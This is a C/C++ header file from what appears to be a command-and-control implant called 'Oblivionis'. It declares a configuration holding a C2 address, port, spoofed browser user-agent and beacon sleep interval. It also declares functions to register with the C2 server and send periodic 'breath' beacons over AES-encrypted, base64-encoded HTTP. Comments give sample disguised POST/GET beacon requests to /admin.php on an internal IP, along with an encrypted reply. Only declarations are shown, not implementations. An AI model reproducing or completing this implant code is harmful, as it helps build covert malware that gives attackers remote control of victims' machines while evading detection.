#ifndef NETWORK_HPP
#define NETWORK_HPP
/*
POST /admin.php HTTP/1.1\r\n
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36\r\n
Host: 192.168.106.136\r\n
Content-Length: 366
Cache-Control: no-cache\r\n\r\n
[数据]
*/

/*
GET /admin.php HTTP/1.1\r\n
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36\r\n
Host: 192.168.106.136\r\n
Cookie: user-info=af32ae120b21ac232c2c1a
*/

/*
HTTP/1.1 200 OK\r\n
Content-Type: text/html\r\n
Date: Thu, 01 Feb 2024 06:15:51 GMT\r\n
Content-Length: 64\r\n
\r\n
bFeYQXk8IEGuTHRLM3CpYJxIJgD5PFfFmBMV1p+O5IOR3T2J+R+03V1JImYDOG0f
*/
#include<stdlib.h>
#include<winsock2.h>
#include<stdio.h>
#include<string.h>
#include"debug.hpp"
#include"OblivionisAES.hpp"
#include"base64.hpp"
#include"KeyExchange.hpp"
#pragma comment(lib, "ws2_32.lib")

struct OblivionisConfig{
    const char *c2addr;
    int c2port;
    // HTTP Head
    const char *useragent;
    const char *url;
    const char *host;
    // addition info
    unsigned char *a;
    int sleep;
};

typedef struct {
    const char *message;
    void *next;
} *Queue;

void initSocket();
void networkSuitInitial();
void registerC2();
void PostBreath();
void inQueue(const char *msg);
OblivionisConfig *getConfig();
#endif